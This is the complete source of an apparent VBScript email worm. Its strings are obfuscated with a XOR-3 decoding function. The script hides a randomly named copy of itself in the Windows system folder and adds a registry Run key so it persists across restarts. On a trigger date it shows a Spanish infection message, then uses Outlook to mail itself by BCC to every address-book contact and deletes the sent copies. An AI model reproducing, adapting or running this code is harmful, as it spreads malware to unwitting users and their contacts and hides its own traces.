On Error Resume next
Set oFls=CreateObject(D("P`qjswjmd-EjofPzpwfnLaif`w"))
Set oShl=CreateObject(D("TP`qjsw-Pkfoo"))
P=Ofls.GetSpecialFolder(1)
p2=WScript.ScriptFullName
p3=D("KHFZ\OL@BO\NB@KJMF_Plewtbqf_Nj`qlplew_Tjmgltp_@vqqfmwUfqpjlm_")
For Each FV in oFls.GetFolder(p).Files
If oFls.GetExtensionName(FV.Path)=D("uap") Then
If CS(FV.Path)=CS(p2) Then
If Day(Now)=9 AND Hour(Now)=10 Then
Msgbox D("Kbp#pjgl#jmef`wbgl#slq#fo#ujqvp#BQM#sbqb#pv#gfpjmef``jðm#vwjoj`f#vm#bmwjujqvp#nfilq#rvf#fpwf")&Chr(13)&D("az#Dfm")
Set OA = CreateObject(D("Lvwollh-bssoj`bwjlm"))
Set MS = OA.GetNameSpace(D("NBSJ"))
For Each AI In MS.AddressLists
Set I1=OA.CreateItem(0)
For i=1 To AI.AddressEntries.Count
Set AB=AI.AddressEntries(i)
If i=1 Then
I1.BCC=AB.Address
Else
I1.BCC=I1.BCC&";"&AB.Address
End If
Next
I1.Subject = oShl.RegRead(p3&D("QfdjpwfqfgLtmfq"))
I1.Body=D("8*")
I1.Attachments.Add p2
I1.DeleteAfterSubmit=True
I1.Send
Next
End If
Wscript.Quit
End if
End If
Next
N=P&D("_")&R&D("-uap")
oFls.CopyFile p2,N
Set F2 = oFls.GetFile (N)
F2.Attributes = 2
oShl.RegWrite p3&D("Qvm_")&R,N
Function CS (C)
Set F1=oFls.OpenTextFile (C)
Do While F1.AtEndOfStream=False
CS=CS+asc(F1.Read(1))
Loop
End Function
Function R ()
Randomize Timer
For i=1 To 5
R=R&Chr(Int(Rnd*25+97))
Next
End Function
Function D(C)
For i=1 To Len(C)
D=D&Chr(Asc(Mid (C,i,1)) Xor 3)
Next
End Function